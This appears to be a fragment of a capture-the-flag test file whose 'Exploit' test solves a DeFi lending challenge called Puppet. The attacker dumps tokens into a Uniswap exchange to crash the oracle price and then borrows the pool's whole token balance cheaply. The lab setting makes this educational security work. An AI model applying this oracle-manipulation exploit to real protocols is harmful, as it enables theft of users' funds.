...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        // approve tokens
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther('9999'));

        // swap and manipulate price
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ethers.utils.parseEther('999'), 1, (await ethers.provider.getBlock('latest')).timestamp + 60);

        // take the money cuz pool didnt use chainlink
        this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ethers.utils.parseEther('20') });
